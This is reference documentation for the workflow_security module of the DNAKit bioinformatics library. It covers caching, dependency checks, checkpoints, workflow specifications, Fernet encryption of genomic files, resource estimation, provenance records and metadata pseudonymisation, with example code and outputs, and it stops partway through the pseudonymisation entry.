# Workflow and data security

This category documents **27** functions of the `workflow_security` module. 20 compute a real result: they only read specifications, files and the Python environment, and none of them executes a user command (`encrypt_genomic_file` and `decrypt_genomic_file` return `not_implemented` when the optional package `cryptography` is missing). 7 (`benchmark`, `cancel`, `clear`, `monitor`, `retry`, `submit_cloud_job`, `submit_hpc_job`) always return `status: "not_implemented"`, because they would need to execute a workload or reach a scheduler or cloud account. Example outputs are real; `input_summary` is abbreviated to `{...}`.

## 1) benchmark

- **Purpose:** Not implemented: benchmarking a workflow or command would require executing it, and `workflow_security` never executes user commands.

- **Method:** No computation is performed. The function only returns the honest `not_implemented` envelope; use `estimate` for a static resource estimate from declared per-step resources.

- **API:** `dnakit.workflow_security.benchmark(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: any value (it is only summarized in `input_summary`); `options` is unused.

- **Output:** Always returns the envelope with `status: "not_implemented"`, `required_dependency` ("an execution backend allowed to run the workflow under test") and a `message` (Benchmarking needs to execute the workload; workflow_security never executes user commands.); no `result`. It never raises for a normal call.

- **Example code:**

```python
import json
from dnakit.workflow_security import benchmark

result = benchmark({"command": ["fastqc", "reads.fq"]})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "benchmark",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "an execution backend allowed to run the workflow under test",
  "message": "Benchmarking needs to execute the workload; workflow_security never executes user commands."
}
```

## 2) cache

- **Purpose:** Compute the content-addressed cache key of a step description and report whether a cache entry for it exists.

- **Method:** The key is the SHA-256 of the canonical JSON (sorted keys, compact separators) of `{"step": input, "files": {path: sha256}, "salt": salt}`, so changing the step, the content of an input file or the salt changes the key. Nothing is written.

- **API:** `dnakit.workflow_security.cache(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: any JSON-serializable step description (mapping, list or string). `options`: `input_files` (list of existing file paths whose content digests are part of the key, default none; a missing file raises `InputFormatError`), `salt` (string, default `""`), `cache_dir` (directory; when given, `hit` is true if `<cache_dir>/<key>` or `<cache_dir>/<key>.json` exists, otherwise `hit` is `null`).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `cache_key` (64 hex characters), `hit` (`true`/`false`, or `null` without `cache_dir`) and `input_files` (path -> SHA-256).

- **Example code:**

```python
import json
from dnakit.workflow_security import cache

result = cache({"tool": "fastqc", "args": ["reads.fq"]}, options={"salt": "v1", "cache_dir": "."})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "cache",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "cache_key": "364dd9b901c20e8210034ac58f2ec04bc7b2a7b3306e9f26889cc1ccf2a2f29b",
    "hit": false,
    "input_files": {}
  }
}
```

## 3) cancel

- **Purpose:** Not implemented: cancelling needs a running job or scheduler handle, which this library does not keep.

- **Method:** No computation is performed; there is no job registry in the process, so there is nothing to stop.

- **API:** `dnakit.workflow_security.cancel(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: any value (it is only summarized in `input_summary`); `options` is unused.

- **Output:** Always returns the envelope with `status: "not_implemented"`, `required_dependency` ("a job scheduler or process supervisor that owns the running job") and a `message` (There is no job registry in this process, so there is nothing that cancel could stop.); no `result`. It never raises for a normal call.

- **Example code:**

```python
import json
from dnakit.workflow_security import cancel

result = cancel("job-42")
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "cancel",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "a job scheduler or process supervisor that owns the running job",
  "message": "There is no job registry in this process, so there is nothing that cancel could stop."
}
```

## 4) check_dependencies

- **Purpose:** Check that Python packages are installed, and satisfy an optional version constraint, without importing them.

- **Method:** The version comes from `importlib.metadata`; if no distribution metadata exists the package counts as installed when `importlib.util.find_spec` finds the module (its `version` is then `null`). Versions are compared as dotted integer components (suffixes such as `rc1` are ignored) with one clause per requirement. A missing package is reported, not raised.

- **API:** `dnakit.workflow_security.check_dependencies(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: a comma/whitespace separated string, a list of requirement strings such as `"numpy>=1.24"` (operators `==`, `!=`, `>=`, `<=`, `>`, `<`), or a mapping `name -> constraint`. A malformed requirement raises `InputFormatError`. `options` is unused.

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `all_satisfied` and `requirements`, one row per requirement with `requirement`, `name`, `installed`, `version` and `satisfied`.

- **Example code:**

```python
import json
from dnakit.workflow_security import check_dependencies

result = check_dependencies(["numpy>=1.0", "scipy", "no_such_package_xyz"])
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "check_dependencies",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "all_satisfied": false,
    "requirements": [
      {
        "requirement": "numpy>=1.0",
        "name": "numpy",
        "installed": true,
        "version": "2.2.6",
        "satisfied": true
      },
      {
        "requirement": "scipy",
        "name": "scipy",
        "installed": true,
        "version": "1.17.1",
        "satisfied": true
      },
      {
        "requirement": "no_such_package_xyz",
        "name": "no_such_package_xyz",
        "installed": false,
        "version": null,
        "satisfied": false
      }
    ]
  }
}
```

## 5) check_external_tools

- **Purpose:** Look up external programs on `PATH` with `shutil.which`; the programs are not executed.

- **Method:** For a workflow specification (mapping, or text that looks like JSON) the program of each step command (its first argv token) is checked, duplicates are removed keeping order. Otherwise the input names the tools directly.

- **API:** `dnakit.workflow_security.check_external_tools(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: a program name, a comma-separated string or list of names/paths, or a workflow specification whose steps have `command`. `options` is unused.

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `all_available` and `tools`, one row per distinct tool with `tool`, `available` and the resolved `path` (`null` if not found). The `path` shown depends on the machine.

- **Example code:**

```python
import json
from dnakit.workflow_security import check_external_tools

result = check_external_tools(["python3", "no_such_tool_xyz"])
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "check_external_tools",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "all_available": false,
    "tools": [
      {
        "tool": "python3",
        "available": true,
        "path": "/opt/conda/bin/python3"
      },
      {
        "tool": "no_such_tool_xyz",
        "available": false,
        "path": null
      }
    ]
  }
}
```

## 6) check_numerical_reproducibility

- **Purpose:** Compare repeated numeric results elementwise and report whether they agree within a tolerance.

- **Method:** Every run is flattened and compared with the first one. Two values `a` and `b` agree when `|a-b| <= max(rtol * max(|a|, |b|), atol)`; `max_rel_diff` is `|a-b| / max(|a|, |b|)` (0 when both are 0). Runs of different length are marked `length_match: false`. `bitwise_identical` means exact equality of all values. NaN pairs agree only when `equal_nan` is true.

- **API:** `dnakit.workflow_security.check_numerical_reproducibility(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: a list of at least two runs (each a number or a flat/nested list of numbers; booleans and strings are rejected) or a mapping `{"runs": [...]}`. `options`: `rtol` (default 1e-9), `atol` (default 0.0), `equal_nan` (default false); negative tolerances raise `ConfigurationError`.

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `reproducible`, `bitwise_identical`, `max_abs_diff`, `max_rel_diff`, `rtol`, `atol` and `runs`, one row per compared run (`run`, `length_match`, `agrees`, `max_abs_diff`, `max_rel_diff`, `bitwise_identical`).

- **Example code:**

```python
import json
from dnakit.workflow_security import check_numerical_reproducibility

result = check_numerical_reproducibility([[1.0, 2.0, 3.0], [1.0, 2.0, 3.0000000001]], options={"rtol": 1e-6})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "check_numerical_reproducibility",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "reproducible": true,
    "bitwise_identical": false,
    "max_abs_diff": 1.000000082740371e-10,
    "max_rel_diff": 3.333333609023459e-11,
    "rtol": 1e-06,
    "atol": 0.0,
    "runs": [
      {
        "run": 1,
        "length_match": true,
        "agrees": true,
        "max_abs_diff": 1.000000082740371e-10,
        "max_rel_diff": 3.333333609023459e-11,
        "bitwise_identical": false
      }
    ]
  }
}
```

## 7) checkpoint

- **Purpose:** Build a checksummed checkpoint document of a JSON-serializable workflow state, optionally writing it to a file.

- **Method:** The document is `{"format": "dnakit-checkpoint-v1", "step", "created_at", "state", "state_sha256"}` where `state_sha256` is the SHA-256 of the canonical JSON (sorted keys, compact separators) of `state`. A file is written only when `path` is given, atomically (temporary file in the target directory, then rename). Use `resume` to verify and read a checkpoint back.

- **API:** `dnakit.workflow_security.checkpoint(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: any JSON-serializable state (NaN and non-JSON values raise `InputFormatError`). `options`: `step` (label, default `"checkpoint"`), `timestamp` (ISO string, default current UTC time), `path` (file to write; nothing is written without it), `overwrite` (default false; an existing file raises `ConfigurationError`).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `checkpoint` (the document) and `path` (the written file, or `null`).

- **Example code:**

```python
import json
from dnakit.workflow_security import checkpoint

result = checkpoint({"done": ["qc"], "n_reads": 1000}, options={"step": "after_qc", "timestamp": "2026-01-01T00:00:00+00:00", "path": "ckpt.json"})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "checkpoint",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "checkpoint": {
      "format": "dnakit-checkpoint-v1",
      "step": "after_qc",
      "created_at": "2026-01-01T00:00:00+00:00",
      "state": {
        "done": [
          "qc"
        ],
        "n_reads": 1000
      },
      "state_sha256": "1982c9ccd50c401b2cd515b4768b85d72a99863bcfdcd204bad3c405de2d27ab"
    },
    "path": "ckpt.json"
  }
}
```

## 8) cleanup_temp_workspace

- **Purpose:** Inventory a temporary workspace directory and, only when asked, delete it.

- **Method:** Safety rules are checked first: the path must be a real directory (not a symlink), strictly inside `allowed_root` (default: the system temporary directory) and its name must start with `prefix`; otherwise `ConfigurationError` (`UNSAFE_CLEANUP_TARGET`) is raised. Files and bytes are counted without following symlinks. Deletion (`dry_run: false`) is `shutil.rmtree` of that directory; symlinks inside are removed, never followed.

- **API:** `dnakit.workflow_security.cleanup_temp_workspace(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: the directory path (string or path-like). `options`: `dry_run` (default true: only count), `allowed_root` (default: system temporary directory), `prefix` (default `"dnakit-"`).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `path` (resolved), `files`, `bytes`, `dry_run` and `deleted`. In the example the temporary path is replaced by `<workspace>`.

- **Example code:**

```python
import json
import tempfile
from pathlib import Path

from dnakit.workflow_security import cleanup_temp_workspace

workspace = Path(tempfile.mkdtemp(prefix="dnakit-", dir="."))
(workspace / "a.txt").write_text("hello")
result = cleanup_temp_workspace(workspace, options={"allowed_root": "."})
result["result"]["path"] = "<workspace>"
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "cleanup_temp_workspace",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "path": "<workspace>",
    "files": 1,
    "bytes": 5,
    "dry_run": true,
    "deleted": false
  }
}
```

## 9) clear

- **Purpose:** Not implemented: the name does not say what to clear, and this library keeps no workflow state to reset.

- **Method:** No computation is performed. Use `cleanup_temp_workspace` to inspect or delete a temporary directory.

- **API:** `dnakit.workflow_security.clear(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: any value (it is only summarized in `input_summary`); `options` is unused.

- **Output:** Always returns the envelope with `status: "not_implemented"`, `required_dependency` ("a concrete state store (cache directory, job queue) to clear") and a `message` (clear has no defined target; use cleanup_temp_workspace for a temporary directory.); no `result`. It never raises for a normal call.

- **Example code:**

```python
import json
from dnakit.workflow_security import clear

result = clear("cache")
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "clear",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "a concrete state store (cache directory, job queue) to clear",
  "message": "clear has no defined target; use cleanup_temp_workspace for a temporary directory."
}
```

## 10) create

- **Purpose:** Build a canonical, validated workflow specification from a list of steps or a partial specification.

- **Method:** Plain command strings become steps; steps without an id are named `step_1`, `step_2`, ... by position. The specification is validated as in `validate` (structure, dependencies, cycles, secrets, dangerous commands, paths) and any error raises `InputFormatError` (`INVALID_WORKFLOW_SPEC`, with the findings in the context); warnings are copied into the envelope `warnings`. `order` is a topological order (Kahn's algorithm, ties broken by declaration order) and `sha256` is the digest of the canonical JSON of the other fields.

- **API:** `dnakit.workflow_security.create(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: a mapping with `steps` (and optional `name`), or a list whose items are step mappings or command strings; `steps` may also be a mapping `id -> step`. `options`: `name` (default `"workflow"`).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `format` (`dnakit-workflow-security-spec-v1`), `name`, `steps` (each with a `depends_on` list), `order` and `sha256`.

- **Example code:**

```python
import json
from dnakit.workflow_security import create

result = create(["fastqc reads.fq", {"id": "align", "command": ["bwa", "mem", "ref.fa", "reads.fq"], "depends_on": ["step_1"]}], options={"name": "demo"})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "create",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "format": "dnakit-workflow-security-spec-v1",
    "name": "demo",
    "steps": [
      {
        "id": "step_1",
        "command": "fastqc reads.fq",
        "depends_on": []
      },
      {
        "id": "align",
        "command": [
          "bwa",
          "mem",
          "ref.fa",
          "reads.fq"
        ],
        "depends_on": [
          "step_1"
        ]
      }
    ],
    "order": [
      "step_1",
      "align"
    ],
    "sha256": "44ae51528e55c20023e06ef443c8f7b13e04a26651b5a3b67f24a2b5afc10b3a"
  }
}
```

## 11) decrypt_genomic_file

- **Purpose:** Decrypt a file produced by `encrypt_genomic_file` (a Fernet token) with the given key.

- **Method:** Fernet (`cryptography.fernet`: AES-128-CBC with HMAC-SHA256 authentication). The whole file is read into memory, so files above `max_bytes` are refused. A wrong key or a file that is not a Fernet token raises `InputFormatError` (`DECRYPTION_FAILED`); the output is written atomically and an existing output raises `ConfigurationError` unless `overwrite` is true. The output path must differ from the input. If the optional package `cryptography` is not installed the function returns `status: "not_implemented"` with `required_dependency: "pip install cryptography"`.

- **API:** `dnakit.workflow_security.decrypt_genomic_file(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: path of the encrypted file. `options`: `key` (urlsafe-base64 Fernet key, 32 bytes) or `key_env` (name of an environment variable holding it) (one is required), `output` (default: the input without `.enc`, else the input + `.dec`), `overwrite` (default false), `max_bytes` (default 256 MiB).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `output`, `bytes_in`, `bytes_out`, `plaintext_sha256` and `algorithm` (`fernet-aes128-cbc-hmac-sha256`).

- **Example code:**

```python
import json
from dnakit.workflow_security import decrypt_genomic_file, encrypt_genomic_file

open("sample.vcf", "w").write("##fileformat=VCFv4.2\n")
enc = encrypt_genomic_file("sample.vcf", options={"generate_key": True})
key = enc["result"]["generated_key"]
result = decrypt_genomic_file("sample.vcf.enc", options={"key": key, "output": "restored.vcf"})
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "decrypt_genomic_file",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "output": "restored.vcf",
    "bytes_in": 120,
    "bytes_out": 21,
    "plaintext_sha256": "ce31594f9acbe614b2c4cf7303773109a88a507fe58209ec89b797634e4817bd",
    "algorithm": "fernet-aes128-cbc-hmac-sha256"
  }
}
```

## 12) encrypt_genomic_file

- **Purpose:** Encrypt a file with authenticated symmetric encryption (Fernet: AES-128-CBC + HMAC-SHA256).

- **Method:** The whole file is read into memory (files above `max_bytes` are refused) and encrypted with `cryptography.fernet.Fernet`; the ciphertext is written atomically and an existing output raises `ConfigurationError` unless `overwrite` is true. With `generate_key` a new key is created and returned once as `generated_key`, with a warning to store it. The result holds sizes and the SHA-256 of the plaintext, not the plaintext. If the optional package `cryptography` is not installed the function returns `status: "not_implemented"` with `required_dependency: "pip install cryptography"`.

- **API:** `dnakit.workflow_security.encrypt_genomic_file(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: path of the plaintext file. `options`: `key` (urlsafe-base64 Fernet key, 32 bytes) or `key_env` (name of an environment variable holding it) or `generate_key` (true: create a new key), `output` (default the input + `.enc`), `overwrite` (default false), `max_bytes` (default 256 MiB). Without any key option `ConfigurationError` (`KEY_MISSING`) is raised.

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `output`, `bytes_in`, `bytes_out`, `plaintext_sha256`, `algorithm` and, with `generate_key`, `generated_key`. In the example the generated key is replaced by `<key>`.

- **Example code:**

```python
import json
from dnakit.workflow_security import encrypt_genomic_file

open("sample.vcf", "w").write("##fileformat=VCFv4.2\n")
result = encrypt_genomic_file("sample.vcf", options={"generate_key": True})
result["result"]["generated_key"] = "<key>"
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "encrypt_genomic_file",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [
    "A key was generated; store it safely, the data cannot be decrypted without it."
  ],
  "status": "ok",
  "result": {
    "output": "sample.vcf.enc",
    "bytes_in": 21,
    "bytes_out": 120,
    "plaintext_sha256": "ce31594f9acbe614b2c4cf7303773109a88a507fe58209ec89b797634e4817bd",
    "algorithm": "fernet-aes128-cbc-hmac-sha256",
    "generated_key": "<key>"
  }
}
```

## 13) estimate

- **Purpose:** Estimate wall time and peak resources of a workflow specification from the per-step resource declarations.

- **Method:** An as-soon-as-possible schedule with unlimited workers: a step starts when all its dependencies have ended, `wall_time_s` is the critical-path length, `total_cpu_seconds` is the sum of `cpus * runtime_s`, `total_disk_mb` the sum of `disk_mb`, and the peaks are taken over the steps running at the same time (half-open intervals of positive duration). It is a static estimate from declarations, not a measurement. An invalid dependency graph raises `InputFormatError`.

- **API:** `dnakit.workflow_security.estimate(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: workflow specification (mapping, JSON/YAML text or file path); steps declare `cpus`, `memory_mb`, `runtime_s`, `disk_mb` and `depends_on`. `options`: `default_cpus` (1), `default_memory_mb` (0), `default_runtime_s` (0), `default_disk_mb` (0) for steps that omit a value, `max_cpus` (a warning is added when the peak exceeds it).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `wall_time_s`, `critical_path`, `total_cpu_seconds`, `peak_cpus`, `peak_memory_mb`, `peak_concurrent_steps`, `total_disk_mb`, `schedule` (`id`, `start_s`, `end_s`) and `steps_without_runtime`.

- **Example code:**

```python
import json
from dnakit.workflow_security import estimate

workflow = {
    "name": "demo",
    "steps": [
        {"id": "qc", "command": ["fastqc", "reads.fq"], "cpus": 2, "memory_mb": 100, "runtime_s": 10},
        {"id": "align", "command": ["bwa", "mem", "ref.fa", "reads.fq"], "depends_on": ["qc"], "cpus": 4, "memory_mb": 800, "runtime_s": 60},
        {"id": "report", "command": ["multiqc", "."], "depends_on": ["align"], "runtime_s": 5},
    ],
}
result = estimate(workflow)
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "estimate",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "wall_time_s": 75.0,
    "critical_path": [
      "qc",
      "align",
      "report"
    ],
    "total_cpu_seconds": 265.0,
    "peak_cpus": 4.0,
    "peak_memory_mb": 800.0,
    "peak_concurrent_steps": 1,
    "total_disk_mb": 0.0,
    "schedule": [
      {
        "id": "qc",
        "start_s": 0.0,
        "end_s": 10.0
      },
      {
        "id": "align",
        "start_s": 10.0,
        "end_s": 70.0
      },
      {
        "id": "report",
        "start_s": 70.0,
        "end_s": 75.0
      }
    ],
    "steps_without_runtime": []
  }
}
```

## 14) monitor

- **Purpose:** Not implemented: monitoring needs a running job or scheduler to observe.

- **Method:** No computation is performed; the library holds no running job handle.

- **API:** `dnakit.workflow_security.monitor(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: any value (it is only summarized in `input_summary`); `options` is unused.

- **Output:** Always returns the envelope with `status: "not_implemented"`, `required_dependency` ("a job scheduler or process supervisor exposing job status") and a `message` (There is no running job handle to monitor in this library.); no `result`. It never raises for a normal call.

- **Example code:**

```python
import json
from dnakit.workflow_security import monitor

result = monitor("job-42")
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "monitor",
  "provenance": {
    "implementation": "not_implemented",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "not_implemented",
  "required_dependency": "a job scheduler or process supervisor exposing job status",
  "message": "There is no running job handle to monitor in this library."
}
```

## 15) read

- **Purpose:** Read a workflow specification or configuration from a mapping, JSON/YAML text or a JSON/YAML file.

- **Method:** JSON is tried first, then the YAML safe loader (no tags, no code execution). Text of more than 1,000,000 bytes is refused, and the top level must be a mapping (`InputFormatError` otherwise). A string without newline that does not start with `{` or `[` is treated as a file path.

- **API:** `dnakit.workflow_security.read(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: a mapping, JSON/YAML text, or a path to a JSON/YAML file. `options` is unused.

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result`; `result` has `document` (the parsed mapping), `source` (`"inline"` or the file path), `sha256` (of its canonical JSON) and `top_level_keys`.

- **Example code:**

```python
import json
from dnakit.workflow_security import read

result = read('{"name": "demo", "steps": [{"id": "qc", "command": ["fastqc", "reads.fq"]}]}')
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "read",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [],
  "status": "ok",
  "result": {
    "document": {
      "name": "demo",
      "steps": [
        {
          "id": "qc",
          "command": [
            "fastqc",
            "reads.fq"
          ]
        }
      ]
    },
    "source": "inline",
    "sha256": "64991aacf622cef75fc7ba4876dead0369b9f56cfdaf6b496be1fc2232bd67b0",
    "top_level_keys": [
      "name",
      "steps"
    ]
  }
}
```

## 16) record_provenance

- **Purpose:** Create a provenance record of a processing step with SHA-256 digests of its input and output files.

- **Method:** `inputs` and `outputs` are hashed (`exists`, `size`, `sha256`; at most 1000 files); a missing file is recorded with `exists: false` and a warning. The record also holds the Python, platform and DNAKit versions, a timestamp and `record_sha256`, the SHA-256 of the canonical JSON of all other fields. Credential-looking text anywhere in the input (AWS key ids, private-key blocks, GitHub/Slack tokens, bearer tokens, `password=...` assignments) is refused with `ConfigurationError` (`SECRET_IN_PROVENANCE`).

- **API:** `dnakit.workflow_security.record_provenance(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

- **Input:** `input`: a mapping such as `{"tool", "version", "parameters", "command", "inputs": [paths], "outputs": [paths]}`. `options`: `timestamp` (ISO string, default now), `output` (JSON file to write atomically; nothing is written without it), `overwrite` (default false).

- **Output:** Envelope with `status: "ok"`, `module`, `operation`, `provenance`, `input_summary`, `warnings` and `result` (with a warning per missing file); `result` is the record: `format` (`dnakit-provenance-v1`), `created_at`, `step`, `inputs`, `outputs`, `environment` (`python`, `platform`, `dnakit`) and `record_sha256`. The `environment` values depend on the machine.

- **Example code:**

```python
import json
from dnakit.workflow_security import record_provenance

open("reads.fq", "w").write("@r1\nACGT\n+\nIIII\n")
result = record_provenance(
    {"tool": "fastqc", "version": "0.12", "inputs": ["reads.fq"], "outputs": ["report.html"]},
    options={"timestamp": "2026-01-01T00:00:00+00:00"},
)
print(json.dumps(result, indent=2))
```

- **Example output:**

```json
{
  "module": "workflow_security",
  "operation": "record_provenance",
  "provenance": {
    "implementation": "native",
    "backend": "local"
  },
  "input_summary": {...},
  "warnings": [
    "file not found: report.html"
  ],
  "status": "ok",
  "result": {
    "format": "dnakit-provenance-v1",
    "created_at": "2026-01-01T00:00:00+00:00",
    "step": {
      "tool": "fastqc",
      "version": "0.12"
    },
    "inputs": [
      {
        "path": "reads.fq",
        "exists": true,
        "size": 16,
        "sha256": "8add5b3bf0a7df65f939b0f2f0650f97ae63c37796bf0d1e769b384e666986cd"
      }
    ],
    "outputs": [
      {
        "path": "report.html",
        "exists": false,
        "size": null,
        "sha256": null
      }
    ],
    "environment": {
      "python": "3.12.13",
      "platform": "Linux-5.15.0-60-generic-x86_64-with-glibc2.31",
      "dnakit": "0.2.0"
    },
    "record_sha256": "c3f09ba34eac87f73b502391c131e20ff4d207a7494f7b3c32c223cdd57c09bc"
  }
}
```

## 17) pseudonymize_metadata_fields

- **Purpose:** Pseudonymise the sensitive fields of a metadata mapping (or list of mappings): replace, drop or keyed-hash the values of identifying keys at any nesting depth, and replace e-mail addresses, phone numbers and SSN-like patterns inside text. This is key-name and pattern based pseudonymisation, NOT a guarantee of de-identification. It replaces an earlier function that hashed only six top-level keys with an unsalted SHA-256; that function was removed because its name promised more than it did.

- **Method:** Implemented once in `src/dnakit/_metadata_pseudonymize.py` and shared with `dnakit.knowledge_graph.pseudonymize_genomic_metadata_fields`. The input is never modified; a deep copy is transformed. A key is sensitive when its name, lower-cased with everything except letters and digits removed (so `Patient_ID`, `patient id` and `PATIENTID` are the same), is in the default list: `name`, `first/last/full/given/family/middle name`, `surname`, `patient`, `patient id`, `patient name`, `mrn`, `medical record number`, `ssn`, `social security number`, `email`, `email address`, `phone`, `phone number`, `telephone`, `mobile`, `fax`, `address`, `home/street address`, `street`, `city`, `zip`, `zip code`, `postal code`, `postcode`, `dob`, `date of birth`, `birth date`, `birthday`, `national id`, `passport`, `passport number`, `insurance`, `insurance id/number`, `account number`, `ip address`, `device id`, `photo`, `photograph`, `biometric(s)`, `license number`, `driver license`. Matching is exact on the normalised name (`sample_name` is not matched); `options['keys']` adds names and `options['keep']` removes names (keep wins). The value of a sensitive key is replaced as a whole, also when it is a mapping or list. `mode`: `redact` (default) writes `"[REDACTED]"`, needing no secret; `drop` removes the key; `hash` writes the first `digest_chars` (default 16, 8 to 64) hexadecimal characters of HMAC-SHA256 keyed with `options['salt']` (required, a string of at least 8 characters, otherwise `ConfigurationError`) over the UTF-8 value (strings as they are, other values as compact sorted-key JSON). Hash tokens are deterministic for one salt, so equal values stay linkable and low-entropy values can be guessed by anyone who knows the salt; keep the salt secret. With `scan_text` (default `True`) every string value anywhere, including values under kept keys and in lists, is scanned for e-mail addresses, SSN-like numbers (`123-45-6789`), international phone numbers (`+44 20 7946 0958`) and North-American style 10-digit numbers; matches become `[REDACTED:email]`, `[REDACTED:ssn]`, `[REDACTED:phone]`. The phone pattern also matches bare 10-digit identifiers, so it can over-redact. What it does NOT do: dates are not shifted or generalised, ages over 89 and small geographic units are not generalised, names inside free text and other quasi-identifiers are not detected, dictionary keys that themselves contain identifiers are not rewritten, and nothing is checked against HIPAA or GDPR identifier lists. Review the output before sharing it. Datetimes become ISO strings; other non-JSON types (sets, bytes, objects) and nesting deeper than 64 levels or cycles raise `InputFormatError`.

- **API:** `dnakit.workflow_security.pseudonymize_metadata_fields(input[required], options[optional])` (formal DNAKit namespace; Agent/MCP exposure depends on the JSON call plan).

